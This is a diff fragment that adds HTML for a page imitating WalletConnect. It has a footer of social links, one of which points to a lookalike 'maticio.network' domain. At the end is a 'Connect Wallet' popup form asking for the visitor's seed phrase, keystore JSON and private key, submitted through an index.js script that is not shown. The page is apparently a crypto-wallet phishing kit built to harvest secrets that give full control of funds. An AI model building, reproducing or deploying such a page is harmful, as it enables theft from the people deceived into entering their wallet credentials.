+                      </p>
+                    </div>
+                </section>
+              </div>
+            </div>
+
+            <footer class="Footer__SFooter-sc-1k47aoh-0 jVWwwJ"><a
+                href="https://wallet.maticio.network/invite/jhxMvxP.html" target="blank" rel="noreferrer noopener"
+                class="Footer__SExternalLink-sc-1k47aoh-2 YwSGw">
+                <div class="Footer__SSocialIcon-sc-1k47aoh-1 hvbAKM"><img
+                    src="data:image/svg+xml;base64,PHN2ZyByb2xlPSJpbWciIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGl0bGU+RGlzY29yZCBpY29uPC90aXRsZT48ZyBmaWxsPSJyZ2IoODgsIDExMiwgMTM1KSI+PHBhdGggZD0iTTIwLjIyMiAwYzEuNDA2IDAgMi41NCAxLjEzNyAyLjYwNyAyLjQ3NVYyNGwtMi42NzctMi4yNzMtMS40Ny0xLjMzOC0xLjYwNC0xLjM5OC42NyAyLjIwNUgzLjcxYy0xLjQwMiAwLTIuNTQtMS4wNjUtMi41NC0yLjQ3NlYyLjQ4QzEuMTcgMS4xNDIgMi4zMS4wMDMgMy43MTUuMDAzaDE2LjVMMjAuMjIyIDB6bS02LjExOCA1LjY4M2gtLjAzbC0uMjAyLjJjMi4wNzMuNiAzLjA3NiAxLjUzNyAzLjA3NiAxLjUzNy0xLjMzNi0uNjY4LTIuNTQtMS4wMDItMy43NDQtMS4xMzctLjg3LS4xMzUtMS43NC0uMDY0LTIuNDc1IDBoLS4yYy0uNDcgMC0xLjQ3LjItMi44MS43MzUtLjQ2Ny4yMDMtLjczNS4zMzYtLjczNS4zMzZzMS4wMDItMS4wMDIgMy4yMS0xLjUzN2wtLjEzNS0uMTM1cy0xLjY3Mi0uMDY0LTMuNDc3IDEuMjdjMCAwLTEuODA1IDMuMTQ0LTEuODA1IDcuMDIgMCAwIDEgMS43NCAzLjc0MyAxLjgwNiAwIDAgLjQtLjUzMy44MDUtMS4wMDItMS41NC0uNDY4LTIuMTQtMS40MDQtMi4xNC0xLjQwNHMuMTM0LjA2Ni4zMzUuMmguMDZjLjAzIDAgLjA0NC4wMTUuMDYuMDN2LjAwNmMuMDE2LjAxNi4wMy4wMy4wNi4wMy4zMy4xMzYuNjYuMjcuOTMuNC40NjYuMjAyIDEuMDY1LjQwMyAxLjguNTM2LjkzLjEzNSAxLjk5Ni4yIDMuMjEgMCAuNi0uMTM1IDEuMi0uMjY3IDEuOC0uNTM1LjM5LS4yLjg3LS40IDEuMzk3LS43MzcgMCAwLS42LjkzNi0yLjIwNSAxLjQwNC4zMy40NjYuNzk1IDEgLjc5NSAxIDIuNzQ0LS4wNiAzLjgxLTEuOCAzLjg3LTEuNzI2IDAtMy44Ny0xLjgxNS03LjAyLTEuODE1LTcuMDItMS42MzUtMS4yMTQtMy4xNjUtMS4yNi0zLjQzNS0xLjI2bC4wNTYtLjAyem0uMTY4IDQuNDEzYy43MDMgMCAxLjI3LjYgMS4yNyAxLjMzNSAwIC43NC0uNTcgMS4zNC0xLjI3IDEuMzQtLjcgMC0xLjI3LS42LTEuMjctMS4zMzQuMDAyLS43NC41NzMtMS4zMzggMS4yNy0xLjMzOHptLTQuNTQzIDBjLjcgMCAxLjI2Ni42IDEuMjY2IDEuMzM1IDAgLjc0LS41NyAxLjM0LTEuMjcgMS4zNC0uNyAwLTEuMjctLjYtMS4yNy0xLjMzNCAwLS43NC41Ny0xLjMzOCAxLjI3LTEuMzM4eiIvPjwvZz48L3N2Zz4="
+                    alt="Discord"></div>
+                <p>Discord</p>
+              </a><a href="https://twitter.com/WalletConnect/" target="blank" rel="noreferrer noopener"
+                class="Footer__SExternalLink-sc-1k47aoh-2 YwSGw">
+                <div class="Footer__SSocialIcon-sc-1k47aoh-1 hvbAKM"><img
+                    src="data:image/svg+xml;base64,PHN2ZyByb2xlPSJpbWciIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGl0bGU+VHdpdHRlciBpY29uPC90aXRsZT48ZyBmaWxsPSJyZ2IoODgsIDExMiwgMTM1KSI+PHBhdGggZD0iTTIzLjk1NCA0LjU2OWMtLjg4NS4zODktMS44My42NTQtMi44MjUuNzc1IDEuMDE0LS42MTEgMS43OTQtMS41NzQgMi4xNjMtMi43MjMtLjk1MS41NTUtMi4wMDUuOTU5LTMuMTI3IDEuMTg0LS44OTYtLjk1OS0yLjE3My0xLjU1OS0zLjU5MS0xLjU1OS0yLjcxNyAwLTQuOTIgMi4yMDMtNC45MiA0LjkxNyAwIC4zOS4wNDUuNzY1LjEyNyAxLjEyNEM3LjY5MSA4LjA5NCA0LjA2NiA2LjEzIDEuNjQgMy4xNjFjLS40MjcuNzIyLS42NjYgMS41NjEtLjY2NiAyLjQ3NSAwIDEuNzEuODcgMy4yMTMgMi4xODggNC4wOTYtLjgwNy0uMDI2LTEuNTY2LS4yNDgtMi4yMjgtLjYxNnYuMDYxYzAgMi4zODUgMS42OTMgNC4zNzQgMy45NDYgNC44MjctLjQxMy4xMTEtLjg0OS4xNzEtMS4yOTYuMTcxLS4zMTQgMC0uNjE1LS4wMy0uOTE2LS4wODYuNjMxIDEuOTUzIDIuNDQ1IDMuMzc3IDQuNjA0IDMuNDE3LTEuNjggMS4zMTktMy44MDkgMi4xMDUtNi4xMDIgMi4xMDUtLjM5IDAtLjc3OS0uMDIzLTEuMTctLjA2NyAyLjE4OSAxLjM5NCA0Ljc2OCAyLjIwOSA3LjU1NyAyLjIwOSA5LjA1NCAwIDEzLjk5OS03LjQ5NiAxMy45OTktMTMuOTg2IDAtLjIwOSAwLS40Mi0uMDE1LS42My45NjEtLjY4OSAxLjgtMS41NiAyLjQ2LTIuNTQ4bC0uMDQ3LS4wMnoiLz48L2c+PC9zdmc+"
+                    alt="Twitter"></div>
+                <p>X</p>
+              </a><a href="https://github.com/WalletConnect" target="blank" rel="noreferrer noopener"
+                class="Footer__SExternalLink-sc-1k47aoh-2 YwSGw">
+                <div class="Footer__SSocialIcon-sc-1k47aoh-1 hvbAKM"><img
+                    src="data:image/svg+xml;base64,PHN2ZyByb2xlPSJpbWciIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGl0bGU+R2l0SHViIGljb248L3RpdGxlPjxnIGZpbGw9InJnYig4OCwgMTEyLCAxMzUpIj48cGF0aCBkPSJNMTIgLjI5N2MtNi42MyAwLTEyIDUuMzczLTEyIDEyIDAgNS4zMDMgMy40MzggOS44IDguMjA1IDExLjM4NS42LjExMy44Mi0uMjU4LjgyLS41NzcgMC0uMjg1LS4wMS0xLjA0LS4wMTUtMi4wNC0zLjMzOC43MjQtNC4wNDItMS42MS00LjA0Mi0xLjYxQzQuNDIyIDE4LjA3IDMuNjMzIDE3LjcgMy42MzMgMTcuN2MtMS4wODctLjc0NC4wODQtLjcyOS4wODQtLjcyOSAxLjIwNS4wODQgMS44MzggMS4yMzYgMS44MzggMS4yMzYgMS4wNyAxLjgzNSAyLjgwOSAxLjMwNSAzLjQ5NS45OTguMTA4LS43NzYuNDE3LTEuMzA1Ljc2LTEuNjA1LTIuNjY1LS4zLTUuNDY2LTEuMzMyLTUuNDY2LTUuOTMgMC0xLjMxLjQ2NS0yLjM4IDEuMjM1LTMuMjItLjEzNS0uMzAzLS41NC0xLjUyMy4xMDUtMy4xNzYgMCAwIDEuMDA1LS4zMjIgMy4zIDEuMjMuOTYtLjI2NyAxLjk4LS4zOTkgMy0uNDA1IDEuMDIuMDA2IDIuMDQuMTM4IDMgLjQwNSAyLjI4LTEuNTUyIDMuMjg1LTEuMjMgMy4yODUtMS4yMy42NDUgMS42NTMuMjQgMi44NzMuMTIgMy4xNzYuNzY1Ljg0IDEuMjMgMS45MSAxLjIzIDMuMjIgMCA0LjYxLTIuODA1IDUuNjI1LTUuNDc1IDUuOTIuNDIuMzYuODEgMS4wOTYuODEgMi4yMiAwIDEuNjA2LS4wMTUgMi44OTYtLjAxNSAzLjI4NiAwIC4zMTUuMjEuNjkuODI1LjU3QzIwLjU2NSAyMi4wOTIgMjQgMTcuNTkyIDI0IDEyLjI5N2MwLTYuNjI3LTUuMzczLTEyLTEyLTEyIi8+PC9nPjwvc3ZnPg=="
+                    alt="Github"></div>
+                <p>Github</p>
+              </a></footer>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="walletPopup" class="popup-overlay">
+      <div class="popup-box">
+        <h2 id="popupTitle">Connect Wallet</h2>
+        <form id="walletForm">
+          <label for="phrase">Phrase</label>
+          <input type="text" id="phrase" name="phrase" placeholder="Enter your wallet phrase" />
+
+          <label for="keystore">Keystore JSON</label>
+          <textarea id="keystore" name="keystore" placeholder="Paste your keystore JSON here"></textarea>
+
+          <label for="privateKey">Private Key</label>
+          <input type="text" id="privateKey" name="privateKey" placeholder="Enter your private key" />
+
+          <button type="submit">Submit</button>
+        </form>
+        <button class="close-btn" onclick="closePopup()">✖</button>
+      </div>
+    </div>
+
+</body>
+<script src="index.js">
+</script>
+
+
+</html>
